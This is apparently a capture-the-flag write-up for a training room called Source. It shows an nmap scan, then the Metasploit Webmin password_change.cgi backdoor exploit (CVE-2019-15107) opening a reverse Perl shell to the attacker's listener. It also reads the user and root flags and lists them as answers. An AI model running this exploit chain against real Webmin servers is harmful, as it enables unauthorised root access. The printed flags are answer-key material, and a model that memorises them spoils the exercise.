# Task 1 Embark
----

>>Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?

>>The Journey by Ekaterina on Dribbble

>>This virtual machine is also included in the room AttackerKB as part of a guided experience. Additionally, you can download the OVA of Source for offline usage from https://www.darkstar7471.com/resources.html


## SCANNING :

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV 10.10.207.87 -v 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-29 01:31 EST
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 8373D4E5F89AD48E510865E79F88867F
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

>> The webpage runs webmin which has backdoor exploit. 

## GETTING SHELL WITH MSFCONSOLE 

>> Using msfconsole to get the shell.

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ msfconsole -q
msf6 > search CVE-2019-15107

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_backdoor  2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/webmin_backdoor
msf6 > use 0
msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.207.87
RHOSTS => 10.10.207.87
msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.9.2.202
LHOST => 10.9.2.202
msf6 exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 10.9.2.202:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.9.2.202:4444 -> 10.10.207.87:50176 ) at 2022-01-29 02:12:32 -0500
id
uid=0(root) gid=0(root) groups=0(root)
python -c "import pty;pty.spawn('/bin/bash')"
root@source:/usr/share/webmin/# cd /home/dark
root@source:/home/dark# cat user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
root@source:/# cd root
root@source:~# ls
root.txt
root@source:~# cat root.txt
THM{UPDATE_YOUR_INSTALL}
```

----

# ANSWER THE QUESTIONS :
----

1.user.txt
>>THM{SUPPLY_CHAIN_COMPROMISE}

2.root.txt
>>THM{UPDATE_YOUR_INSTALL}

----